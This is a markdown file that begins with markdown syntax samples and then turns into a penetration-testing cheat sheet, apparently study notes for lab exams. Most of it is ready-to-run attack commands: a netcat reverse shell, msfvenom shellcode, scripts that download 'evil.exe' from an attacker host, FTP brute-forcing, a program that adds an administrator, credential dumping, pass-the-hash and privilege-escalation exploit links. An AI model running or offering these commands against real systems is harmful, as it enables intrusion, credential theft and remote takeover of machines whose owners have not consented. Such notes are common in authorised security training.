# This is an example < h1 <h1> tag
## This is an  < h2 <h2> tag
###### This is an <h6> tag



*This text will be italic*
_This will also be italic_

**This text will be bold**
__This will also be bold__

_You **can** combine them_




* Item 1
* Item 2
  * Item 2a
  * Item 2b



1. Item 1
1. Item 2
1. Item 3
   1. Item 3a
   1. Item 3b



http://github.com - automatic!
[GitHub](http://github.com)



I think you should use an
`<addr>` element here instead.



```javascript
function fancyAlert(arg) {
  if(arg) {
    $.facebox({div:'#foo'})
  }
}
```


---------------------------------------
# Tips

## Reverse shell

```bash
nc -nv 10.0.0.22 4444 -e /bin/bash
```

```bash
ncat --exec cmd.exe
```

## Enumeration

### nmap
nmap IP -sT

nmap IP --script smb-os-discovery

nmap IP --script smb-*

nmap -sU --open -p 161 IP

### nbtscan
nbtscan -r IP

### enum4linux
enum4linux -a IP

### smbclient




```bash
echo public > community
echo private >> community
echo manager >> community
onesixtyone -c community IP
```


# Checks

* 21/tcp
	* ftp anonymous
		* download/upload+rev-shell
	* ftp brufeforce
		* nmap --script ftp-brute -p 21 IP
		* hydra -t 1 -L wordlist-user -P wordlist-pass -vV IP ftp
		* https://github.com/arjnklc/FTP-Brute-Forcer/blob/master/ftp_brute_forcer.py
* 80/tcp, 443/tcp, web
	* dirb - subpaths, files
	* nikto - vuln, paths
	* cewl - wordlist 

* 139/tcp, 445/tcp
	* smb-security

# Shellcode generation
## windows reverse shell - exploitation - 32 bit
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"
```

## windows reverse shell - exploitation - 32 bit exit as a thread
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"
```

## linux bind shell - exploitation - 32 bit
```bash
msfvenom -p linux/x86/shell_bind_tcp LPORT=PORT -f c -b "\x00\x0a\x0d\x20" –e x86/shikata_ga_nai
```


# Cross compilation
## mingw-w64 
https://www.systutorials.com/docs/linux/man/1-i686-w64-mingw32-gcc/
```bash
 i686-w64-mingw32-gcc 646-fixed.c -lws2_32 -o 646.exe

```

# File transfer

https://blog.ropnop.com/transferring-files-from-kali-to-windows/

## TFTP
Server
```bash
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /usr/share/windows-binaries/nc.exe /tftp/

```
Client
```bash
tftp -i SERVER-IP get nc.exe
```

## FTP
```bash
apt-get update && apt-get install pure-ftpd
```
Create a new user for the ftp server
```bash
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pw useradd offsec -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```
Run the script
```bash
chmod 755 setup-ftp
./setup-ftp
```

Windows commands for connection
```cmd
echo open 10.11.0.5 21> ftp.txt
echo USER offsec>> ftp.txt
echo ftp>> ftp.txt
echo bin >> ftp.txt
echo GET nc.exe >> ftp.txt
echo bye >> ftp.txt
ftp -v -n -s:ftp.txt
```

## Scripting languages
### VBScript
```cmd
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```
Execution
```cmd
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```

### Powershell
```powershell
echo $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://10.11.0.5/evil.exe" >>wget.ps1
echo $file = "new-exploit.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
```
Execution
```cmd
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```
### Debug.exe
for 32 bit systems, with 64k byte size limit for file creation
```
upx -9 nc.exe 
wine exe2bat.exe nc.exe nc.txt
```
todo

## Privilege escalation - Windows
### Exploits
* MS11-080 - Windows XP, Windows 2003 Adf.sys 
	* http://www.exploit-db.com/exploits/18176/ MS11-080
		* ``` python pyinstaller.py --onefile ms11-080.py ```
### Misconfiguration
* icalcs
	* detects insecure permissions
		* ```icalcs binary-name.exe```
```C 
// file useradd.c
#include <stdlib.h>
 /* system, NULL, EXIT_FAILURE */
int main ()
{
	int i;
	i = system ("net localgroup administrators low /add");
	return 0;
}
```
		* ```i686-w64-mingw32-gcc -o filename.exe useradd.c ```
* fgdump.exe / pwdump.exe
	* A utility for dumping passwords on Windows NT/2000/XP/2003 machines 
	* https://github.com/interference-security/kali-windows-binaries/tree/master/fgdump
* Windows Credential Editor (WCE)
	* obtain cleartext passwords and hashes from a compromised Windows host
	* ``` wce_protected.exe –w ```
* pass the hash
```bash  
export SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896
pth-winexe -U administrator% //10.11.01.76 cmd
```
* Windows Group Policy Preferences
```cmd
net use z: \\dc01\SYSVOL
dir /s Groups.xml
copy Z:\DOMAIN-NAME-TO-CHANGE\Policies\{...}\Machine\Preferences\Groups\Groups.xml C:\Users\mike.DOMAIN-NAME-TO-CHANGE\Documents
type A Groups.xml
```
```bash
gpp-decrypt
```


## Privilege escalation - Linux
* Mempodipper - Linux Local Root for >=2.6.39, 32-bit and 64-bit (Ubuntu 11.10, 32 bit CVE 2012-0056)
	* http://www.exploit-db.com/download/18411 Mempodipper
* Linux Kernel 2.2.x/2.4.x (RedHat) - 'ptrace/kmod' Local Privilege Escalation
	* https://www.exploit-db.com/exploits/3

## Redis
http://reverse-tcp.xyz/pentest/database/2017/02/09/Redis-Hacking-Tips.html



## Complete Interactive Web Shell
https://innogen-security.com/linux-tty-shell-using-script/
